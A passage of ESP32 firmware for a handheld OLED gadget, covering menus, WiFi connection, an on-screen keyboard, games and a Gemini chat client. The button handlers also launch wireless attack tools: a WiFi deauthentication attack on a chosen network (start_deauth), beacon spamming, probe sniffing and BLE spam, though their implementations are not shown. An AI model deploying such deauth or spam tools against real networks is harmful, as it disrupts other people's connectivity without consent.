    "Balanced (200 MHz)", // Note: 200 may fallback if not supported
    "Perform (240 MHz)"
  };

  int freqs[] = {160, 200, 240};

  for (int i = 0; i < 3; i++) {
    int y = 25 + i * 15;

    if (i == menuSelection) {
        display.fillRect(x_offset + 5, y - 2, SCREEN_WIDTH - 10, 13, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
    } else {
        display.setTextColor(SSD1306_WHITE);
    }

    display.setCursor(x_offset + 10, y);
    display.print(modes[i]);

    if (currentCpuFreq == freqs[i]) {
       display.setCursor(x_offset + 110, y);
       display.print("*");
    }
  }

  display.display();
}

void showSystemNet(int x_offset) {
  display.clearDisplay();
  drawStatusBar();
  display.setTextSize(1);
  display.setCursor(x_offset + 25, 2);
  display.print("NETWORK INFO");
  display.drawLine(x_offset, 12, x_offset + SCREEN_WIDTH, 12, SSD1306_WHITE);

  if (WiFi.status() == WL_CONNECTED) {
      display.setCursor(x_offset + 2, 16);
      display.print("IP: ");
      display.print(WiFi.localIP());

      display.setCursor(x_offset + 2, 26);
      display.print("GW: ");
      display.print(WiFi.gatewayIP());

      display.setCursor(x_offset + 2, 36);
      display.print("MAC:");
      display.print(WiFi.macAddress());

      display.setCursor(x_offset + 2, 46);
      display.print("SSID:");
      String ssid = WiFi.SSID();
      if(ssid.length() > 10) ssid = ssid.substring(0, 10) + "..";
      display.print(ssid);

      display.setCursor(x_offset + 2, 56);
      display.print("RSSI:");
      display.print(WiFi.RSSI());
      display.print(" dBm");
  } else {
      display.setCursor(x_offset + 10, 30);
      display.print("Not Connected");
  }

  display.display();
}

void showSystemDevice(int x_offset) {
  display.clearDisplay();
  drawStatusBar();
  display.setTextSize(1);
  display.setCursor(x_offset + 25, 2);
  display.print("DEVICE INFO");
  display.drawLine(x_offset, 12, x_offset + SCREEN_WIDTH, 12, SSD1306_WHITE);

  display.setCursor(x_offset + 2, 16);
  display.print("Model: ");
  display.print(ESP.getChipModel());

  display.setCursor(x_offset + 2, 26);
  display.print("Rev: ");
  display.print(ESP.getChipRevision());

  display.setCursor(x_offset + 2, 36);
  display.print("Cores: ");
  display.print(ESP.getChipCores());

  display.setCursor(x_offset + 2, 46);
  display.print("Freq: ");
  display.print(ESP.getCpuFreqMHz());
  display.print(" MHz");

  display.setCursor(x_offset + 2, 56);
  display.print("Storage: ");
  if (LittleFS.totalBytes() > 0) {
      display.print(LittleFS.usedBytes() / 1024);
      display.print("/");
      display.print(LittleFS.totalBytes() / 1024);
      display.print("KB");
  } else {
      display.print("N/A");
  }

  display.display();
}

// ========== UTILITY FUNCTIONS ==========

void drawStatusBar() {
  // Draw WiFi Signal
  if (WiFi.status() == WL_CONNECTED) {
     drawWiFiSignalBars();
  }

  // Draw Time (NTP) - Only in Main Menu
  if (currentState == STATE_MAIN_MENU && cachedTimeStr.length() > 0) {
    display.setCursor(0, 2);
    display.setTextSize(1);
    display.print(cachedTimeStr);
  }

  // Draw Realtime FPS Overlay
  if (showFPS) {
      display.setCursor(35, 2);
      display.setTextSize(1);
      display.print(perfFPS);
  }
}

void drawWiFiSignalBars() {
  int bars = 0;

  if (cachedRSSI > -55) bars = 4;
  else if (cachedRSSI > -65) bars = 3;
  else if (cachedRSSI > -75) bars = 2;
  else if (cachedRSSI > -85) bars = 1;

  int x = SCREEN_WIDTH - 15;
  int y = 8;

  for (int i = 0; i < 4; i++) {
    int h = (i + 1) * 2;
    if (i < bars) {
      display.fillRect(x + (i * 3), y - h + 2, 2, h, SSD1306_WHITE);
    } else {
      display.drawRect(x + (i * 3), y - h + 2, 2, h, SSD1306_WHITE);
    }
  }
}

void drawIcon(int x, int y, const unsigned char* icon) {
  display.drawBitmap(x, y, icon, 8, 8, SSD1306_WHITE);
}

void showStatus(String message, int delayMs) {
  int boxW = SCREEN_WIDTH - 20;
  int boxH = 40;
  int boxX = 10;
  int boxY = (SCREEN_HEIGHT - boxH) / 2;

  display.fillRect(boxX, boxY, boxW, boxH, SSD1306_BLACK);
  display.drawRect(boxX, boxY, boxW, boxH, SSD1306_WHITE);

  display.setCursor(boxX + 5, boxY + 5);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  display.print(message);
  display.display();

  if (delayMs > 0) {
    delay(delayMs);
  }
}

void showProgressBar(String title, int percent) {
  display.clearDisplay();
  drawStatusBar();

  // Center Title
  display.setTextSize(1);
  int titleW = title.length() * 6;
  display.setCursor((SCREEN_WIDTH - titleW) / 2, 18);
  display.print(title);

  int barX = 14;
  int barY = 32;
  int barW = SCREEN_WIDTH - 28;
  int barH = 8;

  // Modern thin rounded bar
  display.drawRoundRect(barX, barY, barW, barH, 4, SSD1306_WHITE);

  int fillW = map(percent, 0, 100, 0, barW - 4);
  if (fillW > 0) {
    display.fillRoundRect(barX + 2, barY + 2, fillW, barH - 4, 2, SSD1306_WHITE);
  }

  // Percentage below
  display.setCursor(SCREEN_WIDTH / 2 - 6, barY + 12);
  display.print(percent);
  display.print("%");

  display.display();
}

void showLoadingAnimation(int x_offset) {
  display.clearDisplay();
  drawStatusBar();

  display.setCursor(x_offset + 35, 25);
  display.print("Loading...");

  int cx = SCREEN_WIDTH / 2;
  int cy = SCREEN_HEIGHT / 2 + 10;
  int r = 10;

  for (int i = 0; i < 8; i++) {
    float angle = (loadingFrame + i) * (2 * PI / 8);
    int x = cx + cos(angle) * r;
    int y = cy + sin(angle) * r;

    if (i == 0) {
      display.fillCircle(x, y, 2, SSD1306_WHITE);
    } else {
      display.drawPixel(x, y, SSD1306_WHITE);
    }
  }

  display.display();
}

void forgetNetwork() {
  WiFi.disconnect(true, true);
  savePreferenceString("ssid", "");
  savePreferenceString("password", "");

  showStatus("Network forgotten", 1500);
  scanWiFiNetworks();
}

void connectToWiFi(String ssid, String password) {
  showProgressBar("Connecting...", 0);

  WiFi.begin(ssid.c_str(), password.c_str());

  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    delay(500);
    attempts++;
    showProgressBar("Connecting...", attempts * 5);
  }

  if (WiFi.status() == WL_CONNECTED) {
    savePreferenceString("ssid", ssid);
    savePreferenceString("password", password);

    showStatus("Connected!", 1500);

    // Sync time
    configTime(25200, 0, "pool.ntp.org", "time.nist.gov");

    changeState(STATE_MAIN_MENU);
  } else {
    showStatus("Failed!", 1500);
    changeState(STATE_WIFI_MENU);
  }
}

// ========== KEYBOARD FUNCTIONS ==========

const char* getCurrentKey() {
  if (currentKeyboardMode == MODE_LOWER) {
    return keyboardLower[cursorY][cursorX];
  } else if (currentKeyboardMode == MODE_UPPER) {
    return keyboardUpper[cursorY][cursorX];
  } else {
    return keyboardNumbers[cursorY][cursorX];
  }
}

void toggleKeyboardMode() {
  if (currentKeyboardMode == MODE_LOWER) {
    currentKeyboardMode = MODE_UPPER;
  } else if (currentKeyboardMode == MODE_UPPER) {
    currentKeyboardMode = MODE_NUMBERS;
  } else {
    currentKeyboardMode = MODE_LOWER;
  }
}

void drawKeyboard(int x_offset) {
  display.clearDisplay();
  drawStatusBar();

  // Input Box
  display.drawRoundRect(x_offset + 2, 2, SCREEN_WIDTH - 4, 14, 4, SSD1306_WHITE);

  display.setCursor(x_offset + 5, 5);
  String displayText = "";
  if (keyboardContext == CONTEXT_WIFI_PASSWORD) {
     for(unsigned int i=0; i<passwordInput.length(); i++) displayText += "*";
  } else {
     displayText = userInput;
  }

  int maxChars = 18;
  if (displayText.length() > maxChars) {
      displayText = displayText.substring(displayText.length() - maxChars);
  }
  display.print(displayText);

  int startY = 20;
  int keyW = 11;
  int keyH = 11;
  int gap = 1;

  for (int r = 0; r < 3; r++) {
    for (int c = 0; c < 10; c++) {
      int x = 3 + c * (keyW + gap); // Shift slightly right
      int y = startY + r * (keyH + gap);

      const char* keyLabel;
      if (currentKeyboardMode == MODE_LOWER) {
         keyLabel = keyboardLower[r][c];
      } else if (currentKeyboardMode == MODE_UPPER) {
         keyLabel = keyboardUpper[r][c];
      } else {
         keyLabel = keyboardNumbers[r][c];
      }

      if (r == cursorY && c == cursorX) {
        display.fillRoundRect(x, y, keyW, keyH, 2, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
      } else {
        display.drawRoundRect(x, y, keyW, keyH, 2, SSD1306_WHITE);
        display.setTextColor(SSD1306_WHITE);
      }

      // Center char
      int tX = x + 3;
      if(strlen(keyLabel) > 1) tX = x + 1; // Adjust for "OK" or "<"

      display.setCursor(tX, y + 2);
      display.print(keyLabel);
    }
  }

  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(4, 56);
  display.print(currentKeyboardMode == MODE_LOWER ? "[abc]" : (currentKeyboardMode == MODE_UPPER ? "[ABC]" : "[123]"));
  display.setCursor(40, 56);
  display.print("SEL:Enter #:Mode");

  display.display();
}

void handleKeyPress() {
  const char* key = getCurrentKey();

  if (strcmp(key, "OK") == 0) {
    if (keyboardContext == CONTEXT_CHAT) {
      sendToGemini();
    } else if (keyboardContext == CONTEXT_BLE_NAME) {
      bleTargetName = userInput;
      changeState(STATE_TOOL_BLE_MENU);
    }
  } else if (strcmp(key, "<") == 0) {
    if (userInput.length() > 0) {
      userInput.remove(userInput.length() - 1);
    }
  } else if (strcmp(key, "#") == 0) {
    toggleKeyboardMode();
  } else {
    userInput += key;
  }
}

void handlePasswordKeyPress() {
  const char* key = getCurrentKey();

  if (strcmp(key, "OK") == 0) {
    connectToWiFi(selectedSSID, passwordInput);
  } else if (strcmp(key, "<") == 0) {
    if (passwordInput.length() > 0) {
      passwordInput.remove(passwordInput.length() - 1);
    }
  } else if (strcmp(key, "#") == 0) {
    toggleKeyboardMode();
  } else {
    passwordInput += key;
  }
}

// ========== INPUT HANDLING ==========

void handleUp() {
  switch(currentState) {
    case STATE_MAIN_MENU:
      if (menuSelection > 0) {
        menuSelection--;
        menuTargetScrollY = menuSelection * 22;
        menuTextScrollX = 0;
        lastMenuTextScrollTime = millis();
      }
      break;
    case STATE_WIFI_MENU:
      if (menuSelection > 0) {
        menuSelection--;
      }
      break;
    case STATE_WIFI_SCAN:
      if (selectedNetwork > 0) {
        selectedNetwork--;
        if (selectedNetwork < wifiPage * wifiPerPage) {
          wifiPage--;
        }
      }
      break;
    case STATE_GAME_SELECT:
      if (menuSelection > 0) {
        menuSelection--;
      }
      break;
    case STATE_RACING_MODE_SELECT:
      if (menuSelection > 0) {
        menuSelection--;
      }
      break;
    case STATE_SYSTEM_POWER:
      if (menuSelection > 0) {
        menuSelection--;
      }
      break;
    case STATE_SYSTEM_MENU:
      if (systemMenuSelection > 0) {
        systemMenuSelection--;
      }
      break;
    case STATE_SYSTEM_SUB_STATUS:
      if (systemMenuSelection > 0) systemMenuSelection--;
      break;
    case STATE_SYSTEM_SUB_SETTINGS:
      if (systemMenuSelection > 0) systemMenuSelection--;
      break;
    case STATE_SYSTEM_SUB_TOOLS:
      if (systemMenuSelection > 0) systemMenuSelection--;
      break;
    case STATE_DEAUTH_SELECT:
      if (selectedNetwork > 0) {
        selectedNetwork--;
        if (selectedNetwork < wifiPage * wifiPerPage) {
          wifiPage--;
        }
      }
      break;
    case STATE_TOOL_BLE_MENU:
      if (menuSelection > 0) menuSelection--;
      break;
    case STATE_API_SELECT:
      if (menuSelection > 0) {
        menuSelection--;
      }
      break;
    case STATE_KEYBOARD:
    case STATE_PASSWORD_INPUT:
      cursorY--;
      if (cursorY < 0) cursorY = 2; // Wrap to bottom
      break;
    case STATE_PIN_LOCK:
    case STATE_CHANGE_PIN:
      cursorY--;
      if (cursorY < 0) cursorY = 3; // Wrap to bottom (4 rows)
      break;
    case STATE_CHAT_RESPONSE:
      if (scrollOffset > 0) {
        scrollOffset -= 10;
      }
      break;
    case STATE_GAME_PONG:
      // Handled in handlePongInput
      break;
    case STATE_GAME_SIDE_SCROLLER:
      // Handled in handleSideScrollerInput
      break;
    case STATE_GAME_RACING:
      // Handled in input loop for gas
      break;
  }
}

void handleDown() {
  switch(currentState) {
    case STATE_MAIN_MENU:
      if (menuSelection < 5) {
        menuSelection++;
        menuTargetScrollY = menuSelection * 22;
        menuTextScrollX = 0;
        lastMenuTextScrollTime = millis();
      }
      break;
    case STATE_WIFI_MENU:
      if (menuSelection < 2) {
        menuSelection++;
      }
      break;
    case STATE_WIFI_SCAN:
      if (selectedNetwork < networkCount - 1) {
        selectedNetwork++;
        if (selectedNetwork >= (wifiPage + 1) * wifiPerPage) {
          wifiPage++;
        }
      }
      break;
    case STATE_GAME_SELECT:
      if (menuSelection < 4) { // Increased to 4 (5 items)
        menuSelection++;
      }
      break;
    case STATE_RACING_MODE_SELECT:
      if (menuSelection < 1) { // 2 items: 0 and 1
        menuSelection++;
      }
      break;
    case STATE_SYSTEM_POWER:
      if (menuSelection < 2) {
        menuSelection++;
      }
      break;
    case STATE_SYSTEM_MENU:
      if (systemMenuSelection < 3) { // 3 items + back
        systemMenuSelection++;
      }
      break;
    case STATE_SYSTEM_SUB_STATUS:
      if (systemMenuSelection < 3) systemMenuSelection++;
      break;
    case STATE_SYSTEM_SUB_SETTINGS:
      if (systemMenuSelection < 6) systemMenuSelection++;
      break;
    case STATE_SYSTEM_SUB_TOOLS:
      if (systemMenuSelection < 10) systemMenuSelection++;
      break;
    case STATE_DEAUTH_SELECT:
      if (selectedNetwork < networkCount - 1) {
        selectedNetwork++;
        if (selectedNetwork >= (wifiPage + 1) * wifiPerPage) {
          wifiPage++;
        }
      }
      break;
    case STATE_TOOL_BLE_MENU:
      if (menuSelection < 3) menuSelection++;
      break;
    case STATE_API_SELECT:
      if (menuSelection < 1) {
        menuSelection++;
      }
      break;
    case STATE_KEYBOARD:
    case STATE_PASSWORD_INPUT:
      cursorY++;
      if (cursorY > 2) cursorY = 0; // Wrap to top
      break;
    case STATE_PIN_LOCK:
    case STATE_CHANGE_PIN:
       cursorY++;
       if (cursorY > 3) cursorY = 0; // Wrap to top (4 rows)
       break;
    case STATE_CHAT_RESPONSE:
      scrollOffset += 10;
      break;
    case STATE_GAME_PONG:
       // Handled in handlePongInput
      break;
    case STATE_GAME_SIDE_SCROLLER:
       // Handled in handleSideScrollerInput
      break;
    case STATE_GAME_RACING:
       // Brake handled in input loop
       break;
  }
}

void handleLeft() {
  switch(currentState) {
    case STATE_KEYBOARD:
    case STATE_PASSWORD_INPUT:
      cursorX--;
      if (cursorX < 0) cursorX = 9; // Wrap to right
      break;
    case STATE_PIN_LOCK:
    case STATE_CHANGE_PIN:
      cursorX--;
      if (cursorX < 0) cursorX = 2; // Wrap to right (3 cols)
      break;
    case STATE_GAME_SPACE_INVADERS:
      // Handled in handleSpaceInvadersInput
      break;
    case STATE_GAME_SIDE_SCROLLER:
      // Handled in handleSideScrollerInput
      break;
    case STATE_GAME_RACING:
      // Steer
      break;
  }
}

void handleRight() {
  switch(currentState) {
    case STATE_KEYBOARD:
    case STATE_PASSWORD_INPUT:
      cursorX++;
      if (cursorX > 9) cursorX = 0; // Wrap to left
      break;
    case STATE_PIN_LOCK:
    case STATE_CHANGE_PIN:
      cursorX++;
      if (cursorX > 2) cursorX = 0; // Wrap to left (3 cols)
      break;
    case STATE_GAME_SPACE_INVADERS:
      // Handled in handleSpaceInvadersInput
      break;
    case STATE_GAME_SIDE_SCROLLER:
       // Handled in handleSideScrollerInput
      break;
    case STATE_GAME_RACING:
       // Steer
      break;
  }
}

void handleSelect() {
  switch(currentState) {
    case STATE_MAIN_MENU:
      handleMainMenuSelect();
      break;
    case STATE_WIFI_MENU:
      handleWiFiMenuSelect();
      break;
    case STATE_WIFI_SCAN:
      if (networkCount > 0) {
        selectedSSID = networks[selectedNetwork].ssid;
        if (networks[selectedNetwork].encrypted) {
          passwordInput = "";
          keyboardContext = CONTEXT_WIFI_PASSWORD;
          cursorX = 0;
          cursorY = 0;
          changeState(STATE_PASSWORD_INPUT);
        } else {
          connectToWiFi(selectedSSID, "");
        }
      }
      break;
    case STATE_GAME_SELECT:
      handleGameSelectSelect();
      break;
    case STATE_RACING_MODE_SELECT:
      handleRacingModeSelect();
      break;
    case STATE_SYSTEM_MENU:
      handleSystemMenuSelect();
      break;
    case STATE_SYSTEM_SUB_STATUS:
      handleSystemStatusMenuSelect();
      break;
    case STATE_SYSTEM_SUB_SETTINGS:
      handleSystemSettingsMenuSelect();
      break;
    case STATE_SYSTEM_SUB_TOOLS:
      handleSystemToolsMenuSelect();
      break;
    case STATE_DEAUTH_SELECT:
      if (networkCount > 0) {
        start_deauth(selectedNetwork, DEAUTH_TYPE_SINGLE, 1);
        changeState(STATE_TOOL_DEAUTH);
      }
      break;
    case STATE_SYSTEM_POWER:
      {
        int targetFreq = 240;
        if (menuSelection == 0) targetFreq = 160;
        else if (menuSelection == 1) targetFreq = 200;
        else targetFreq = 240;

        bool success = setCpuFrequencyMhz(targetFreq);
        currentCpuFreq = getCpuFrequencyMhz(); // Get actual set freq

        savePreferenceInt("cpu_freq", currentCpuFreq);

        String msg = "CPU: " + String(currentCpuFreq) + " MHz";
        showStatus(msg, 1000);
        changeState(STATE_SYSTEM_MENU);
      }
      break;
    case STATE_SYSTEM_BENCHMARK:
      if (benchmarkDone) {
          currentI2C = recommendedI2C;
          Wire.setClock(currentI2C);

          savePreferenceInt("i2c_freq", currentI2C);

          showStatus("Saved!", 1000);
          changeState(STATE_SYSTEM_MENU);
      }
      break;
    case STATE_TOOL_BLE_MENU:
      handleBLEMenuSelect();
      break;
    case STATE_TOOL_COURIER:
      checkResiReal();
      break;
    case STATE_API_SELECT:
      handleAPISelectSelect();
      break;
    case STATE_KEYBOARD:
      handleKeyPress();
      break;
    case STATE_PASSWORD_INPUT:
      handlePasswordKeyPress();
      break;
    case STATE_PIN_LOCK:
      handlePinLockKeyPress();
      break;
    case STATE_CHANGE_PIN:
      handleChangePinKeyPress();
      break;
    case STATE_GAME_SPACE_INVADERS:
      // Shoot
      triggerNeoPixelEffect(pixels.Color(200, 200, 200), 50); // White flash
      for (int i = 0; i < MAX_BULLETS; i++) {
        if (!invaders.bullets[i].active) {
          invaders.bullets[i].x = invaders.playerX + invaders.playerWidth / 2;
          invaders.bullets[i].y = invaders.playerY;
          invaders.bullets[i].active = true;
          
          // Double shot
          if (invaders.weaponType >= 1 && i < MAX_BULLETS - 1) {
            invaders.bullets[i+1].x = invaders.playerX + 2;
            invaders.bullets[i+1].y = invaders.playerY;
            invaders.bullets[i+1].active = true;
            i++;
          }
          
          // Triple shot
          if (invaders.weaponType >= 2 && i < MAX_BULLETS - 1) {
            invaders.bullets[i+1].x = invaders.playerX + invaders.playerWidth - 2;
            invaders.bullets[i+1].y = invaders.playerY;
            invaders.bullets[i+1].active = true;
          }
          break;
        }
      }
      break;
    case STATE_GAME_SIDE_SCROLLER:
      // Shoot
      for (int i = 0; i < MAX_SCROLLER_BULLETS; i++) {
        if (!scroller.bullets[i].active) {
          scroller.bullets[i].x = scroller.playerX + 4;
          scroller.bullets[i].y = scroller.playerY;
          scroller.bullets[i].dirX = 1;
          scroller.bullets[i].dirY = 0;
          scroller.bullets[i].damage = scroller.weaponLevel;
          scroller.bullets[i].active = true;
          
          // Multi-shot based on weapon level
          if (scroller.weaponLevel >= 2 && i < MAX_SCROLLER_BULLETS - 1) {
            scroller.bullets[i+1].x = scroller.playerX + 4;
            scroller.bullets[i+1].y = scroller.playerY;
            scroller.bullets[i+1].dirX = 1;
            scroller.bullets[i+1].dirY = -1;
            scroller.bullets[i+1].damage = scroller.weaponLevel;
            scroller.bullets[i+1].active = true;
            i++;
          }
          
          if (scroller.weaponLevel >= 3 && i < MAX_SCROLLER_BULLETS - 1) {
            scroller.bullets[i+1].x = scroller.playerX + 4;
            scroller.bullets[i+1].y = scroller.playerY;
            scroller.bullets[i+1].dirX = 1;
            scroller.bullets[i+1].dirY = 1;
            scroller.bullets[i+1].damage = scroller.weaponLevel;
            scroller.bullets[i+1].active = true;
          }
          break;
        }
      }
      break;
    case STATE_GAME_RACING:
       // Clutch logic handles shift
       break;
  }
}

void handleBackButton() {
  switch(currentState) {
    // WiFi Flow
    case STATE_PASSWORD_INPUT:
      changeState(STATE_WIFI_SCAN);
      break;
    case STATE_WIFI_SCAN:
      changeState(STATE_WIFI_MENU);
      break;
    case STATE_WIFI_MENU:
      changeState(STATE_MAIN_MENU);
      break;

    // Chat AI Flow
    case STATE_CHAT_RESPONSE:
      changeState(STATE_KEYBOARD);
      break;
    case STATE_KEYBOARD:
      if (keyboardContext == CONTEXT_CHAT) {
        changeState(STATE_API_SELECT);
      } else { // CONTEXT_WIFI_PASSWORD
        changeState(STATE_WIFI_SCAN);
      }
      break;
    case STATE_API_SELECT:
      changeState(STATE_MAIN_MENU);
      break;

    // Game Flow
    case STATE_GAME_SPACE_INVADERS:
    case STATE_GAME_SIDE_SCROLLER:
    case STATE_GAME_PONG:
      changeState(STATE_GAME_SELECT);
      break;
    case STATE_GAME_RACING:
      changeState(STATE_RACING_MODE_SELECT);
      break;
    case STATE_RACING_MODE_SELECT:
      changeState(STATE_GAME_SELECT);
      break;
    case STATE_GAME_SELECT:
      changeState(STATE_MAIN_MENU);
      break;

    // Other simple cases
    case STATE_PIN_LOCK:
      // Prevent exit (Security)
      break;
    case STATE_SYSTEM_MENU:
    case STATE_VIDEO_PLAYER:
      changeState(STATE_MAIN_MENU);
      break;
    case STATE_SYSTEM_SUB_STATUS:
      changeState(STATE_SYSTEM_MENU);
      systemMenuSelection = 0;
      break;
    case STATE_SYSTEM_SUB_SETTINGS:
      changeState(STATE_SYSTEM_MENU);
      systemMenuSelection = 1;
      break;
    case STATE_SYSTEM_SUB_TOOLS:
      changeState(STATE_SYSTEM_MENU);
      systemMenuSelection = 2;
      break;
    case STATE_SYSTEM_PERF:
    case STATE_SYSTEM_NET:
    case STATE_SYSTEM_DEVICE:
      changeState(STATE_SYSTEM_SUB_STATUS);
      break;
    case STATE_SYSTEM_BENCHMARK:
      changeState(STATE_SYSTEM_SUB_TOOLS);
      break;
    case STATE_SYSTEM_POWER:
      changeState(STATE_SYSTEM_SUB_SETTINGS);
      break;
    case STATE_TOOL_SPAMMER:
    case STATE_TOOL_DETECTOR:
    case STATE_TOOL_PROBE_SNIFFER:
      stopWifiTools();
      changeState(STATE_SYSTEM_SUB_TOOLS);
      break;
    case STATE_DEAUTH_SELECT:
      changeState(STATE_SYSTEM_SUB_TOOLS);
      break;
    case STATE_TOOL_DEAUTH:
      stop_deauth();
      changeState(STATE_DEAUTH_SELECT);
      break;
    case STATE_TOOL_BLE_MENU:
      changeState(STATE_SYSTEM_SUB_TOOLS);
      break;
    case STATE_TOOL_BLE_RUN:
      stopBLESpam();
      display.invertDisplay(false);
      changeState(STATE_TOOL_BLE_MENU);
      break;
    case STATE_TOOL_COURIER:
      if (previousState == STATE_MAIN_MENU) changeState(STATE_MAIN_MENU);
      else changeState(STATE_SYSTEM_SUB_TOOLS);
      break;

    default:
      // Default back to main menu if we're lost
      changeState(STATE_MAIN_MENU);
      break;
  }
}

void displayResponse() {
  display.clearDisplay();
  drawStatusBar();

  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  int y = 12 - scrollOffset;
  int lineHeight = 10;
  String word = "";
  int x = 0;

  for (unsigned int i = 0; i < aiResponse.length(); i++) {
    char c = aiResponse.charAt(i);

    if (c == ' ' || c == '\n' || i == aiResponse.length() - 1) {
      if (i == aiResponse.length() - 1 && c != ' ' && c != '\n') {
        word += c;
      }

      int wordWidth = word.length() * 6;

      if (x + wordWidth > SCREEN_WIDTH - 10) {
        y += lineHeight;
        x = 0;
      }

      if (y >= -lineHeight && y < SCREEN_HEIGHT) {
        display.setCursor(x, y);
        display.print(word);
      }

      x += wordWidth + 6;
      word = "";

      if (c == '\n') {
        y += lineHeight;
        x = 0;
      }
    } else {
      word += c;
    }
  }

  display.display();
}

void sendToGemini() {
  currentState = STATE_LOADING;
  loadingFrame = 0;
  lastLoadingUpdate = millis();

  for (int i = 0; i < 5; i++) {
    showLoadingAnimation();
    delay(100);
    loadingFrame++;
  }

  if (WiFi.status() != WL_CONNECTED) {
    ledError();
    aiResponse = "WiFi not connected!";
    currentState = STATE_CHAT_RESPONSE;
    scrollOffset = 0;
    displayResponse();
    return;
  }

  const char* currentApiKey = (selectedAPIKey == 1) ? geminiApiKey1 : geminiApiKey2;

  HTTPClient http;
  String url = String(geminiEndpoint) + "?key=" + currentApiKey;

  http.begin(url);
  http.addHeader("Content-Type", "application/json");
  http.setTimeout(15000);

  // Construct prompt with history
  String fullPrompt = "";
  if (chatHistory.length() > 0) {
    fullPrompt += "History:\n" + chatHistory + "\n";
  }
  fullPrompt += "User: " + userInput;

  String escapedInput = fullPrompt;
  escapedInput.replace("\\", "\\\\");
  escapedInput.replace("\"", "\\\"");
  escapedInput.replace("\n", "\\n");

  String jsonPayload = "{\"contents\":[{\"parts\":[{\"text\":\"" + escapedInput + "\"}]}]}";

  int httpResponseCode = http.POST(jsonPayload);

  if (httpResponseCode == 200) {
    String response = http.getString();

    JsonDocument responseDoc;
    DeserializationError error = deserializeJson(responseDoc, response);

    if (!error && !responseDoc["candidates"].isNull()) {
      JsonArray candidates = responseDoc["candidates"];
      if (candidates.size() > 0) {
        JsonObject content = candidates[0]["content"];
        JsonArray parts = content["parts"];
        if (parts.size() > 0) {
          aiResponse = parts[0]["text"].as<String>();
          appendToChatHistory(userInput, aiResponse);
          ledSuccess();
        } else {
          aiResponse = "Error: Empty response";
        }
      } else {
        aiResponse = "Error: No candidates";
      }
    } else {
      ledError();
      aiResponse = "JSON Error";
    }
  } else {
    ledError();
    aiResponse = "HTTP Error " + String(httpResponseCode);
  }

  http.end();
  lastWiFiActivity = millis();

  currentState = STATE_CHAT_RESPONSE;
  scrollOffset = 0;
  displayResponse();
}
